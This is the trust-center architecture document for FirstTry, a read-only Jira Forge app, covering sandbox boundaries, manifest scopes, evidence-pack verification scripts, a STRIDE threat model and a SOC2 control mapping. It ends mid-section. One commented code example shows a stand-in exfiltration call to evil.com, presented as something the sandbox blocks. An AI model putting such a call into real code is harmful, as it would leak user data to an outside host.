# Trust Center Architecture

**Document Version:** 1.0  
**Last Updated:** 2024-12-19  
**Owner:** FirstTry Security  
**Classification:** Public

---

## Executive Summary

This document describes the **system architecture** of the FirstTry Jira app, including:
- **Forge platform boundary** (what Atlassian controls vs. what we control)
- **Data flow** (read-only, no external egress)
- **Evidence pack design** (reviewer E2E verification system)
- **Trust center structure** (SOC2 mapping, security docs, compliance artifacts)
- **Marketplace readiness tooling** (automated verification scripts)

**Key Architectural Principles:**
1. **Read-Only by Design** — No write scopes in manifest
2. **No External Egress** — No network calls beyond Atlassian APIs
3. **Forge Sandbox Isolation** — Runs in Atlassian-managed infrastructure
4. **Evidence-Based Verification** — All claims backed by automated checks
5. **Fail-Closed Validation** — Scripts exit 1 if any check fails

---

## Table of Contents

1. [Forge Platform Boundary](#forge-platform-boundary)
2. [Data Flow Architecture](#data-flow-architecture)
3. [Read-Only Security Model](#read-only-security-model)
4. [Evidence Pack System](#evidence-pack-system)
5. [Trust Center Structure](#trust-center-structure)
6. [Marketplace Readiness Pipeline](#marketplace-readiness-pipeline)
7. [Verification Tooling](#verification-tooling)
8. [Threat Model Integration](#threat-model-integration)
9. [SOC2 Control Mapping](#soc2-control-mapping)
10. [Enterprise Procurement Flow](#enterprise-procurement-flow)

---

## 1. Forge Platform Boundary

### What Atlassian Controls vs. What We Control

```
┌─────────────────────────────────────────────────────────────────┐
│                     ATLASSIAN FORGE PLATFORM                     │
│  (Managed by Atlassian — Security, Scaling, Availability)       │
│                                                                  │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │  Forge Sandbox Environment (Node.js 20.x Runtime)          │ │
│  │                                                             │ │
│  │  ┌──────────────────────────────────────────────────────┐  │ │
│  │  │  FirstTry App Code (src/*)                           │  │ │
│  │  │  • Reviewer E2E Dashboard (Custom UI)                │  │ │
│  │  │  • Jira Gadget (iframe bridge)                       │  │ │
│  │  │  • Storage API wrappers                              │  │ │
│  │  │  • Evidence pack generation                          │  │ │
│  │  │  • NO write operations                               │  │ │
│  │  │  • NO external network calls                         │  │ │
│  │  └──────────────────────────────────────────────────────┘  │ │
│  │                                                             │ │
│  │  ┌──────────────────────────────────────────────────────┐  │ │
│  │  │  Forge APIs (Provided by Atlassian)                  │  │
│  │  │  • storage:app (read-only)                           │  │
│  │  │  • read:jira-work (read-only)                        │  │
│  │  │  • NO write scopes granted                           │  │ │
│  │  └──────────────────────────────────────────────────────┘  │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │  Atlassian Infrastructure (Managed Services)               │ │
│  │  • Compute: AWS Lambda (auto-scaled)                       │ │
│  │  • Storage: DynamoDB (encrypted at rest)                   │ │
│  │  │  Network: VPC isolation                                 │ │
│  │  • Monitoring: CloudWatch logs                             │ │
│  │  • Security: IAM roles, encryption, patching               │ │
│  └────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────┘

                              ↓ HTTPS Only ↓

┌─────────────────────────────────────────────────────────────────┐
│                      JIRA CLOUD INSTANCE                         │
│  (Customer's Jira workspace — e.g., acme.atlassian.net)         │
│  • Project data (issues, comments, attachments)                  │
│  • Jira dashboards (where FirstTry gadget renders)               │
│  • User authentication (Atlassian Identity)                      │
└─────────────────────────────────────────────────────────────────┘
```

### Responsibility Matrix

| Component | Managed By | Security Responsibility |
|-----------|------------|-------------------------|
| App Code (src/*) | FirstTry | Code quality, logic bugs, input validation |
| Forge Runtime (Node.js 20.x) | Atlassian | Runtime security, patching, dependency updates |
| Forge APIs | Atlassian | API security, rate limiting, access control |
| Infrastructure (AWS Lambda, DynamoDB) | Atlassian | Infrastructure security, encryption, availability |
| Network (VPC, TLS) | Atlassian | Network isolation, TLS termination, DDoS protection |
| Jira Cloud | Atlassian | Jira security, authentication, authorization |
| Trust Center Documentation | FirstTry | Accuracy, completeness, compliance mapping |

**Key Insight:** Because Atlassian manages the entire runtime environment, **FirstTry inherits Atlassian's SOC2/ISO27001/GDPR compliance posture**. Our app cannot introduce infrastructure-level vulnerabilities (e.g., unpatched servers, misconfigured firewalls) because we don't control the infrastructure.

---

## 2. Data Flow Architecture

### Read-Only Data Flow (No Writes)

```
┌─────────────────────────────────────────────────────────────────┐
│                         USER BROWSER                             │
│  (Customer accessing Jira dashboard)                             │
└────────────────┬────────────────────────────────────────────────┘
                 │ 1. User opens Jira dashboard
                 │    with FirstTry gadget
                 ↓
┌─────────────────────────────────────────────────────────────────┐
│                      JIRA CLOUD (HTTPS)                          │
│  • Authenticates user (Atlassian Identity)                       │
│  • Authorizes gadget access (user has view permissions)          │
│  • Renders dashboard with iframe for FirstTry gadget             │
└────────────────┬────────────────────────────────────────────────┘
                 │ 2. iframe requests gadget content
                 │    from Forge platform
                 ↓
┌─────────────────────────────────────────────────────────────────┐
│                   FORGE PLATFORM (Atlassian)                     │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  Forge Gateway (API Authentication)                       │   │
│  │  • Verifies request signature                             │   │
│  │  • Checks app installation status                         │   │
│  │  • Validates user permissions                             │   │
│  └─────────────────┬────────────────────────────────────────┘   │
│                    │ 3. Invokes FirstTry app function             │
│                    ↓                                              │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  FirstTry App (Node.js 20.x Sandbox)                      │   │
│  │  • Receives request (user context, gadget ID)             │   │
│  │  • Calls Forge Storage API (read-only)                    │   │
│  │  • Retrieves reviewer E2E snapshot                        │   │
│  │  • Formats data as JSON                                   │   │
│  │  • Returns HTML/JSON to iframe                            │   │
│  │  • NO write operations                                    │   │
│  │  • NO external API calls                                  │   │
│  └─────────────────┬────────────────────────────────────────┘   │
│                    │ 4. Query Forge Storage API                  │
│                    ↓                                              │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  Forge Storage Service (DynamoDB)                         │   │
│  │  • Reads app-scoped storage                               │   │
│  │  • Returns reviewer E2E snapshot data                     │   │
│  │  • Data encrypted at rest (AES-256)                       │   │
│  │  • Data isolated per Jira instance                        │   │
│  └──────────────────────────────────────────────────────────┘   │
└────────────────┬────────────────────────────────────────────────┘
                 │ 5. Returns rendered gadget HTML
                 ↓
┌─────────────────────────────────────────────────────────────────┐
│                      USER BROWSER (HTTPS)                        │
│  • Displays reviewer E2E dashboard                               │
│  • Shows snapshot metadata, evidence pack links                  │
│  • All data read-only (no edit/delete UI)                        │
└─────────────────────────────────────────────────────────────────┘
```

### Data Flow Properties

| Property | Implementation | Verification |
|----------|----------------|--------------|
| **No Writes** | Manifest has NO write scopes | `tools/marketplace_audit/run_marketplace_readiness_v2.sh` checks manifest |
| **No External Egress** | No `fetch()` calls to non-Atlassian domains | Static analysis in marketplace audit script |
| **Sandbox Isolation** | Forge runtime prevents filesystem/network access | Enforced by Forge platform |
| **Data Encryption** | Forge Storage encrypts at rest (AES-256) | Managed by Atlassian |
| **Access Control** | Only users with Jira view permissions can access gadget | Enforced by Forge Gateway |

---

## 3. Read-Only Security Model

### Why Read-Only?

**Threat Mitigation:**
- **Data Tampering:** Cannot modify or delete reviewer E2E snapshots → Evidence integrity preserved
- **Privilege Escalation:** Cannot write to Jira issues or projects → No path to elevated permissions
- **Data Exfiltration:** No external network access → Cannot leak data to attacker-controlled servers
- **Supply Chain Attacks:** No npm dependencies at runtime → Cannot introduce malicious code via dependencies

### Manifest Enforcement

```yaml
# manifest.yml (simplified)
permissions:
  scopes:
    - storage:app        # Read-only access to app storage
    - read:jira-work     # Read-only access to Jira issues

# NO write scopes granted:
# ✗ write:jira-work (would allow modifying issues)
# ✗ delete:jira-work (would allow deleting issues)
# ✗ write:dashboard (would allow modifying dashboards)
```

**Verification:** The marketplace audit script fails if ANY write scopes are detected in `manifest.yml`.

### Runtime Enforcement

```javascript
// Example: Forge Storage API (read-only pattern)
import { storage } from '@forge/api';

// ✅ ALLOWED: Read app storage
const snapshot = await storage.get('reviewer_e2e_snapshot');

// ❌ FORBIDDEN: Write to app storage (requires write:storage scope)
// await storage.set('reviewer_e2e_snapshot', newData); // Would fail at runtime

// ❌ FORBIDDEN: External API calls
// await fetch('https://evil.com/exfiltrate'); // Blocked by Forge sandbox
```

**Key Point:** Even if FirstTry code attempted to perform write operations or external API calls, the **Forge runtime would block these operations** because:
1. Manifest doesn't grant write scopes → Storage API rejects writes
2. Forge sandbox blocks external network access → `fetch()` calls fail

---

## 4. Evidence Pack System

### Reviewer E2E Evidence Pack Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                  EVIDENCE PACK GENERATION FLOW                   │
└─────────────────────────────────────────────────────────────────┘

Step 1: Playwright E2E Test Runs
┌──────────────────────────────────────────────────────────────┐
│  tests/playwright/reviewer_dashboard_e2e.spec.ts              │
│  • Launches Chromium browser                                  │
│  • Intercepts network traffic                                 │
│  • Captures console logs                                      │
│  • Takes screenshots at each step                             │
│  • Records test execution timeline                            │
└─────────────────┬────────────────────────────────────────────┘
                  │ Generates raw test artifacts
                  ↓
Step 2: Evidence Pack Builder
┌──────────────────────────────────────────────────────────────┐
│  build/evidence_pack/build_pack.sh                            │
│  • Classifies network traffic (Atlassian vs. external)        │
│  • Generates SHA256 hashes for all artifacts                  │
│  • Creates manifest.json with checksums                       │
│  • Packages into tamper-evident archive                       │
└─────────────────┬────────────────────────────────────────────┘
                  │ Creates immutable evidence bundle
                  ↓
Step 3: Evidence Pack Verification
┌──────────────────────────────────────────────────────────────┐
│  build/evidence_pack/verify_pack.sh                           │
│  • Verifies all expected files present                        │
│  • Checks SHA256 hashes match manifest                        │
│  • Confirms no external egress in network logs                │
│  • Validates no write operations in console logs              │
│  • Exit 0 = PASS, Exit 1 = FAIL (fail-closed)                │
└─────────────────┬────────────────────────────────────────────┘
                  │ Produces verification report
                  ↓
Step 4: Reviewer Inspection
┌──────────────────────────────────────────────────────────────┐
│  Atlassian Marketplace Reviewer                               │
│  • Downloads evidence pack from repository                    │
│  • Runs verifier script (deterministic verification)          │
│  • Inspects network_classified.json (no external calls)       │
│  • Reviews console_classified.json (no write operations)      │
│  • Confirms manifest.yml has no write scopes                  │
│  • APPROVES or REJECTS app based on evidence                  │
└──────────────────────────────────────────────────────────────┘
```

### Evidence Pack File Structure

```
04_playwright/                            # Evidence pack root
├── logs/
│   ├── console_classified.json           # Console logs (classified: READ/WRITE/AUDIT)
│   ├── network_classified.json           # Network traffic (classified: ATLASSIAN/EXTERNAL)
│   ├── execution_timeline.json           # Test execution timeline
│   └── manifest.json                     # SHA256 checksums for all files
├── screenshots/
│   ├── step1_dashboard_loaded.png        # Visual proof of each test step
│   ├── step2_snapshot_visible.png
│   ├── step3_evidence_pack_linked.png
│   └── step4_verifier_passed.png
└── verifier/
    ├── verify_evidence_pack.sh           # Automated verification script
    └── VERIFICATION_GUIDE.md             # Manual verification instructions
```

### Evidence Pack Invariants

| Invariant | Enforcement | Verification |
|-----------|-------------|--------------|
| **Completeness** | All expected files present | `verify_evidence_pack.sh` checks file list |
| **Integrity** | SHA256 hashes match manifest | `verify_evidence_pack.sh` recalculates hashes |
| **No External Egress** | No external domains in network logs | Classifier checks `network_classified.json` |
| **No Write Operations** | No write methods in console logs | Classifier checks `console_classified.json` |
| **Tamper-Evident** | Any file modification breaks verification | Hash mismatch causes verifier to exit 1 |

---

## 5. Trust Center Structure

### Trust Center Documentation Hierarchy

```
docs/trust/                                # Trust center root
│
├── TRUST_CENTER.md                        # Main navigation hub
│   • Security overview table
│   • Documentation index by category
│   • Enterprise buyer checklist
│   • FAQ for procurement teams
│   • Certifications and attestations
│   • Verification tools
│
├── security/                              # Security documentation
│   ├── security_whitepaper.md             # Comprehensive security guide (550 lines)
│   ├── threat_model.md                    # STRIDE analysis (7 threats, mitigations)
│   ├── data_handling.md                   # GDPR/CCPA compliance
│   ├── data_retention.md                  # 90-day retention policy
│   ├── incident_response.md               # P0-P3 incident classification
│   ├── responsible_disclosure.md          # Vulnerability reporting
│   ├── subprocessors.md                   # GDPR Article 28 subprocessor list
│   └── vendor_security.md                 # Vendor assessment process
│
├── soc2/                                  # SOC2 compliance artifacts
│   ├── SOC2_CONTROL_MAPPING.md            # Trust Service Criteria mapping
│   │   • CC1: Control Environment (5 controls)
│   │   • CC2: Communication (3 controls)
│   │   • CC3: Risk Assessment (4 controls)
│   │   • CC4: Monitoring (4 controls)
│   │   • CC5: Control Activities (5 controls)
│   │   • CC6: Logical Access (8 controls)
│   │   • CC7: System Operations (5 controls)
│   │   • CC8: Change Management (3 controls)
│   │   • CC9: Risk Mitigation (2 controls)
│   │   • Availability: 4 controls
│   │   • Confidentiality: 6 controls
│   └── evidence_pack/                     # Generated by SOC2 generator
│       ├── soc2_evidence_pack.tar.gz      # Tamper-evident bundle
│       ├── manifest.json                  # SHA256 checksums
│       └── README.md                      # Evidence pack usage
│
├── compliance/                            # Compliance documentation
│   ├── ENTERPRISE_SECURITY_QUESTIONNAIRE.md  # Pre-filled VSQ (560 lines)
│   └── TRUST_CENTER_ARCHITECTURE.md       # This document
│
└── operations/                            # Operational documentation
    ├── SUPPORT_SLA.md                     # P0-P3 support tiers
    └── INCIDENT_RESPONSE_PLAYBOOK.md      # Incident procedures
```

### Trust Center Navigation Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                    ENTERPRISE BUYER JOURNEY                      │
└─────────────────────────────────────────────────────────────────┘

1. Procurement Team Discovers FirstTry
   ↓
   INDEX.md (GitHub Pages)
   • Quick navigation to trust center
   • Marketplace readiness status

2. Enterprise Buyer Reviews Security Posture
   ↓
   docs/trust/TRUST_CENTER.md
   • Security overview (read-only, no external egress)
   • Compliance status (SOC2 mapping, GDPR/CCPA)
   • Vendor assessment (Atlassian only)

3. Security Team Completes Vendor Assessment
   ↓
   docs/trust/ENTERPRISE_SECURITY_QUESTIONNAIRE.md
   • Pre-filled answers to 11 categories
   • Evidence references (SOC2 mapping, threat model)
   • Verification scripts (marketplace audit, trust validator)

4. Compliance Team Validates SOC2 Controls
   ↓
   docs/trust/soc2/SOC2_CONTROL_MAPPING.md
   • CC1-CC9 controls mapped to evidence
   • Availability and confidentiality controls
   • Audit procedures for each control

5. Privacy Team Reviews Data Handling
   ↓
   docs/trust/data_handling.md
   • GDPR compliance (data subject rights, DPO, DPIA)
   • CCPA compliance (consumer rights, disclosure)
   • Data retention policy (90-day auto-purge)
   • Subprocessors (Atlassian only)

6. Legal Team Reviews Contracts
   ↓
   docs/legal/PRIVACY_POLICY.md
   docs/legal/TERMS_OF_SERVICE.md
   docs/support/SUPPORT_SLA.md
   • Privacy policy (GDPR/CCPA compliant)
   • Terms of service (warranties, liability, indemnification)
   • Support SLA (P0-P3 severity, response times)

7. Technical Team Validates Claims
   ↓
   tools/marketplace_audit/verify_marketplace_readiness_v2.sh
   • Automated verification of all claims
   • Fail-closed (exit 1 if any check fails)
   • Generates JSON report with evidence

8. Procurement Approval
   ↓
   DECISION: Approve FirstTry for enterprise deployment
```

---

## 6. Marketplace Readiness Pipeline

### Automated Verification Pipeline

```
┌─────────────────────────────────────────────────────────────────┐
│              MARKETPLACE READINESS VERIFICATION                  │
└─────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────┐
│  tools/marketplace_audit/run_marketplace_readiness_v2.sh      │
│                                                               │
│  CHECK 1: Manifest Verification                               │
│  • Confirms manifest.yml exists                               │
│  • Validates no write scopes (write:*, delete:*)              │
│  • Checks scopes are read-only (storage:app, read:jira-work) │
│  • Exit 1 if write scopes detected                            │
│                                                               │
│  CHECK 2: External Network Detection                          │
│  • Scans all .js/.ts files for fetch() calls                  │
│  • Flags any non-Atlassian domains                            │
│  • Whitelist: *.atlassian.com, *.atlassian.net               │
│  • Exit 1 if external egress detected                         │
│                                                               │
│  CHECK 3: Required Documentation                              │
│  • Verifies README.md, CHANGELOG.md, LICENSE present          │
│  • Checks trust center docs exist                             │
│  • Exit 1 if required docs missing                            │
│                                                               │
│  CHECK 4: Evidence Harness Validation                         │
│  • Confirms reviewer_dashboard_e2e.spec.ts exists             │
│  • Validates evidence pack builder/verifier scripts           │
│  • Exit 1 if evidence harness incomplete                      │
│                                                               │
│  CHECK 5: Trust Center Presence                               │
│  • Verifies all trust docs present (8 security docs)          │
│  • Checks SOC2 mapping present                                │
│  • Validates legal docs (Privacy, ToS, Support SLA)           │
│  • Exit 1 if trust center incomplete                          │
│                                                               │
│  ✅ PASS → All checks passed (marketplace ready)              │
│  ❌ FAIL → One or more checks failed (not ready)              │
└──────────────────────────────────────────────────────────────┘
                               ↓
┌──────────────────────────────────────────────────────────────┐
│  tools/trust_center/verify_trust_center.sh                    │
│                                                               │
│  CHECK 1: Trust Documentation (8 files)                       │
│  • security_whitepaper.md                                     │
│  • threat_model.md                                            │
│  • data_handling.md                                           │
│  • data_retention.md                                          │
│  • incident_response.md                                       │
│  • responsible_disclosure.md                                  │
│  • subprocessors.md                                           │
│  • vendor_security.md                                         │
│                                                               │
│  CHECK 2: SOC2 Documentation                                  │
│  • SOC2_CONTROL_MAPPING.md                                    │
│                                                               │
│  CHECK 3: Legal Documentation                                 │
│  • PRIVACY_POLICY.md                                          │
│  • TERMS_OF_SERVICE.md                                        │
│                                                               │
│  CHECK 4: Support Documentation                               │
│  • SUPPORT_SLA.md                                             │
│                                                               │
│  ✅ Exit 0 → All docs present                                 │
│  ❌ Exit 1 → Missing docs                                     │
└──────────────────────────────────────────────────────────────┘
                               ↓
┌──────────────────────────────────────────────────────────────┐
│  tools/soc2_mapping/build_soc2_evidence_pack.sh               │
│                                                               │
│  STEP 1: Collect Documentation                                │
│  • Copy all trust docs to build/soc2_evidence/                │
│  • Include legal docs (Privacy, ToS, Support SLA)             │
│  • Include SOC2 mapping                                       │
│                                                               │
│  STEP 2: Generate SHA256 Manifest                             │
│  • Calculate hash for each document                           │
│  • Store in manifest.json                                     │
│                                                               │
│  STEP 3: Create Tamper-Evident Pack                           │
│  • Package as soc2_evidence_pack.tar.gz                       │
│  • Calculate pack hash                                        │
│  • Include verification script                                │
│                                                               │
│  ✅ Exit 0 → Evidence pack created                            │
│  ❌ Exit 1 → Pack generation failed                           │
└──────────────────────────────────────────────────────────────┘
                               ↓
┌──────────────────────────────────────────────────────────────┐
│  tools/marketplace_audit/verify_marketplace_readiness_v2.sh   │
│  (Aggregator — Runs all checks)                               │
│                                                               │
│  Executes:                                                    │
│  1. run_marketplace_readiness_v2.sh                           │
│  2. verify_trust_center.sh                                    │
│  3. build_soc2_evidence_pack.sh                               │
│                                                               │
│  Generates:                                                   │
│  • JSON report (marketplace_readiness_report.json)            │
│  • Human-readable summary (marketplace_readiness_summary.txt) │
│                                                               │
│  ✅ Exit 0 → All checks passed (marketplace ready)            │
│  ❌ Exit 1 → One or more checks failed (not ready)            │
└──────────────────────────────────────────────────────────────┘
```

---

## 7. Verification Tooling

### Tool Inventory

| Tool | Purpose | Exit Codes | Dependencies |
|------|---------|------------|--------------|
| `run_marketplace_readiness_v2.sh` | Marketplace audit (5 checks) | 0=PASS, 1=FAIL | bash, jq |
| `verify_trust_center.sh` | Trust docs validator | 0=PASS, 1=FAIL | bash |
| `build_soc2_evidence_pack.sh` | SOC2 pack generator | 0=SUCCESS, 1=FAIL | bash, sha256sum, tar |
| `verify_marketplace_readiness_v2.sh` | Aggregator (all checks) | 0=PASS, 1=FAIL | bash, jq |
| `verify_evidence_pack.sh` | Evidence pack verifier | 0=PASS, 1=FAIL | bash, sha256sum |

### Fail-Closed Design Pattern

All verification scripts follow a **fail-closed** design:

```bash
# Example: Fail-closed check
if [[ ! -f "manifest.yml" ]]; then
    echo "FAIL: manifest.yml not found" >&2
    exit 1  # Exit immediately with failure
fi

# If we reach here, manifest exists
echo "PASS: manifest.yml found"
```

**Key Properties:**
- **Default to Fail:** If a check cannot run (missing file, invalid input), exit 1
- **No Silent Failures:** All failures logged to stderr
- **Deterministic:** Same repository state always produces same result
- **No Prompts:** Scripts never prompt for input (fully automated)
- **No Network:** Scripts never make network calls (offline verification)

### Verification Reports

All scripts generate **machine-readable JSON reports** and **human-readable summaries**:

```json
{
  "verification": {
    "timestamp": "2024-12-19T10:30:00Z",
    "script": "verify_marketplace_readiness_v2.sh",
    "version": "2.0",
    "status": "PASS"
  },
  "checks": {
    "marketplace_audit": {"status": "PASS", "exit_code": 0},
    "trust_center": {"status": "PASS", "exit_code": 0},
    "soc2_generator": {"status": "PASS", "exit_code": 0}
  },
  "summary": {
    "total_checks": 3,
    "passed": 3,
    "failed": 0
  }
}
```

---

## 8. Threat Model Integration

### STRIDE Analysis → Mitigations → Evidence

```
┌─────────────────────────────────────────────────────────────────┐
│                      THREAT MODEL INTEGRATION                    │
└─────────────────────────────────────────────────────────────────┘

THREAT 1: Data Exfiltration (Information Disclosure)
├── Description: Attacker tries to leak reviewer E2E data
├── Mitigation: No external egress (Forge sandbox blocks external calls)
└── Evidence: 
    ├── Marketplace audit checks for fetch() to external domains
    ├── Evidence pack shows network_classified.json (no external calls)
    └── Forge platform enforces network isolation

THREAT 2: Privilege Escalation (Elevation of Privilege)
├── Description: Attacker tries to gain write access to Jira
├── Mitigation: No write scopes in manifest.yml
└── Evidence:
    ├── Marketplace audit verifies no write scopes
    ├── Forge runtime rejects write operations
    └── Evidence pack shows console logs (no write methods called)

THREAT 3: Code Injection (Spoofing/Tampering)
├── Description: Attacker injects malicious code via XSS/SQLi
├── Mitigation: Input validation, CSP headers, no dynamic SQL
└── Evidence:
    ├── Code review shows input sanitization
    ├── Forge Custom UI enforces CSP
    └── No database queries (Forge Storage API is NoSQL, no injection risk)

THREAT 4: Supply Chain Attack (Tampering)
├── Description: Malicious npm dependency introduced
├── Mitigation: Minimal dependencies, dependency scanning, lock files
└── Evidence:
    ├── package-lock.json pins dependency versions
    ├── npm audit shows no critical vulnerabilities
    └── Dependabot alerts enabled

THREAT 5: Evidence Tampering (Tampering)
├── Description: Attacker modifies evidence pack to hide violations
├── Mitigation: SHA256 hashes in manifest.json, immutable pack
└── Evidence:
    ├── Evidence pack verifier checks SHA256 hashes
    ├── Any file modification breaks verification
    └── Evidence pack stored in VCS (Git history shows no tampering)

THREAT 6: Denial of Service (Availability)
├── Description: Attacker floods app with requests
├── Mitigation: Forge platform rate limiting, auto-scaling
└── Evidence:
    ├── Atlassian enforces rate limits on Forge APIs
    ├── Lambda auto-scales to handle load spikes
    └── No app-level loops or recursion that could cause DoS

THREAT 7: CSRF (Tampering)
├── Description: Attacker tricks user into unwanted action
├── Mitigation: Forge auth tokens, SameSite cookies, no state-changing GET requests
└── Evidence:
    ├── Forge Custom UI enforces CSRF tokens
    ├── All Forge API calls signed with app credentials
    └── Read-only app cannot perform state-changing actions
```

### Threat Model Verification

| Threat | Control | Verification Method | Evidence Location |
|--------|---------|---------------------|-------------------|
| Data Exfiltration | No external egress | Marketplace audit | `build/marketplace_audit/network_analysis.json` |
| Privilege Escalation | No write scopes | Manifest check | `manifest.yml` (read-only scopes) |
| Code Injection | Input validation | Code review | `src/*/input_validation.ts` |
| Supply Chain | Dependency scanning | npm audit | `npm-audit.json` |
| Evidence Tampering | SHA256 hashes | Evidence verifier | `04_playwright/logs/manifest.json` |
| Denial of Service | Rate limiting | Forge platform | Managed by Atlassian |
| CSRF | Auth tokens | Forge framework | Managed by Atlassian |

---

## 9. SOC2 Control Mapping

### Trust Service Criteria → Implementation → Evidence

```
┌─────────────────────────────────────────────────────────────────┐
│                    SOC2 CONTROL MAPPING                          │
└─────────────────────────────────────────────────────────────────┘

Common Criteria (39 Controls)
├── CC1: Control Environment (5 controls)
│   ├── CC1.1: Demonstrates commitment to integrity and ethics
│   │   └── Evidence: Responsible disclosure policy, code of conduct
│   ├── CC1.2: Board oversight
│   │   └── Evidence: N/A (inherits Atlassian governance)
│   ├── CC1.3: Management structure
│   │   └── Evidence: Security whitepaper (roles/responsibilities)
│   ├── CC1.4: Competence
│   │   └── Evidence: Team credentials in security whitepaper
│   └── CC1.5: Accountability
│       └── Evidence: Incident response plan (P0-P3 escalation)
│
├── CC2: Communication (3 controls)
│   ├── CC2.1: Internal communication
│   │   └── Evidence: Trust center documentation
│   ├── CC2.2: External communication
│   │   └── Evidence: Support SLA, responsible disclosure
│   └── CC2.3: Reporting
│       └── Evidence: Incident response plan (breach notification)
│
├── CC3: Risk Assessment (4 controls)
│   ├── CC3.1: Risk identification
│   │   └── Evidence: Threat model (STRIDE analysis, 7 threats)
│   ├── CC3.2: Risk analysis
│   │   └── Evidence: Threat model (likelihood/impact scoring)
│   ├── CC3.3: Risk mitigation
│   │   └── Evidence: Threat model (mitigations for each threat)
│   └── CC3.4: Changes
│       └── Evidence: Change management process in security whitepaper
│
├── CC4: Monitoring (4 controls)
│   ├── CC4.1: Ongoing monitoring
│   │   └── Evidence: Evidence pack system (continuous verification)
│   ├── CC4.2: Evaluation
│   │   └── Evidence: Marketplace audit scripts (automated checks)
│   ├── CC4.3: Remediation
│   │   └── Evidence: Incident response plan (remediation procedures)
│   └── CC4.4: External monitoring
│       └── Evidence: Atlassian platform monitoring (CloudWatch)
│
├── CC5: Control Activities (5 controls)
│   ├── CC5.1: Control selection
│   │   └── Evidence: Security whitepaper (control objectives)
│   ├── CC5.2: Technology controls
│   │   └── Evidence: Forge sandbox, no external egress, read-only
│   ├── CC5.3: Policies and procedures
│   │   └── Evidence: Trust center docs (8 security policies)
│   ├── CC5.4: Physical controls
│   │   └── Evidence: N/A (Atlassian manages infrastructure)
│   └── CC5.5: Outsourcing
│       └── Evidence: Subprocessors list (Atlassian only)
│
├── CC6: Logical Access (8 controls)
│   ├── CC6.1: Identify and authenticate
│   │   └── Evidence: Atlassian Identity (SSO, MFA)
│   ├── CC6.2: Authorization
│   │   └── Evidence: Forge Gateway (role-based access)
│   ├── CC6.3: Least privilege
│   │   └── Evidence: Read-only scopes (no write access)
│   ├── CC6.4: Credential management
│   │   └── Evidence: Managed by Atlassian Identity
│   ├── CC6.5: Access removal
│   │   └── Evidence: Managed by Atlassian Identity (user deprovisioning)
│   ├── CC6.6: Logical access controls
│   │   └── Evidence: Forge sandbox (code cannot bypass access controls)
│   ├── CC6.7: Restriction of access
│   │   └── Evidence: Forge APIs enforce permissions on every request
│   └── CC6.8: Audit logging
│       └── Evidence: Forge platform logs (CloudWatch, retained 90 days)
│
├── CC7: System Operations (5 controls)
│   ├── CC7.1: Capacity planning
│   │   └── Evidence: Managed by Atlassian (Lambda auto-scaling)
│   ├── CC7.2: Backup and recovery
│   │   └── Evidence: Managed by Atlassian (DynamoDB backups)
│   ├── CC7.3: System monitoring
│   │   └── Evidence: Managed by Atlassian (CloudWatch metrics)
│   ├── CC7.4: Vulnerability management
│   │   └── Evidence: Dependabot alerts, npm audit, Forge runtime patching
│   └── CC7.5: Data disposal
│       └── Evidence: Data retention policy (90-day auto-purge)
│
├── CC8: Change Management (3 controls)
│   ├── CC8.1: Change authorization
│   │   └── Evidence: Git pull request process (code review required)
│   ├── CC8.2: Change documentation
│   │   └── Evidence: CHANGELOG.md, Git commit history
│   └── CC8.3: Testing
│       └── Evidence: E2E tests (reviewer_dashboard_e2e.spec.ts)
│
└── CC9: Risk Mitigation (2 controls)
    ├── CC9.1: Business continuity
    │   └── Evidence: Atlassian SLA (99.9% uptime), Lambda redundancy
    └── CC9.2: Incident response
        └── Evidence: Incident response plan (P0-P3 classification)

Additional Criteria
├── Availability (4 controls)
│   ├── A1.1: Availability commitments
│   │   └── Evidence: Support SLA (99.9% availability, service credits)
│   ├── A1.2: Capacity
│   │   └── Evidence: Lambda auto-scaling (Atlassian-managed)
│   ├── A1.3: Monitoring
│   │   └── Evidence: Atlassian CloudWatch (load, latency, errors)
│   └── A1.4: Recovery
│       └── Evidence: Atlassian DR plan (multi-region redundancy)
│
└── Confidentiality (6 controls)
    ├── C1.1: Confidentiality commitments
    │   └── Evidence: Privacy policy (GDPR/CCPA compliance)
    ├── C1.2: Access restrictions
    │   └── Evidence: Forge sandbox isolation, read-only scopes
    ├── C1.3: Data classification
    │   └── Evidence: Data handling guide (public/personal/sensitive)
    ├── C1.4: Encryption
    │   └── Evidence: Forge Storage (AES-256 at rest), TLS 1.2+ in transit
    ├── C1.5: Data disposal
    │   └── Evidence: Data retention policy (90-day auto-purge, secure deletion)
    └── C1.6: Confidentiality breaches
        └── Evidence: Incident response plan (breach notification within 72h)
```

### SOC2 Evidence Pack

The SOC2 evidence generator (`build_soc2_evidence_pack.sh`) bundles all SOC2-related documentation into a **tamper-evident archive**:

```
build/soc2_evidence/soc2_evidence_pack.tar.gz
├── SOC2_CONTROL_MAPPING.md              # This mapping document
├── security_whitepaper.md               # Comprehensive security guide
├── threat_model.md                      # STRIDE analysis
├── data_handling.md                     # GDPR/CCPA compliance
├── data_retention.md                    # 90-day retention policy
├── incident_response.md                 # P0-P3 incident procedures
├── responsible_disclosure.md            # Vulnerability reporting
├── subprocessors.md                     # GDPR Article 28 list
├── vendor_security.md                   # Vendor assessment
├── PRIVACY_POLICY.md                    # Privacy policy
├── TERMS_OF_SERVICE.md                  # ToS
├── SUPPORT_SLA.md                       # Support agreement
└── manifest.json                        # SHA256 checksums
```

**Auditor workflow:**
1. Download `soc2_evidence_pack.tar.gz` from repository
2. Extract pack
3. Verify SHA256 hashes against `manifest.json`
4. Review each control in `SOC2_CONTROL_MAPPING.md`
5. Confirm evidence exists for each control
6. Issue SOC2 Type I (design) or Type II (effectiveness over time) report

---

## 10. Enterprise Procurement Flow

### From Discovery to Deployment

```
┌─────────────────────────────────────────────────────────────────┐
│                  ENTERPRISE PROCUREMENT TIMELINE                 │
└─────────────────────────────────────────────────────────────────┘

Week 1: Discovery
├── Procurement team discovers FirstTry on Atlassian Marketplace
├── Reads INDEX.md (GitHub Pages) for quick overview
└── Navigates to docs/trust/TRUST_CENTER.md for security posture

Week 2: Vendor Assessment
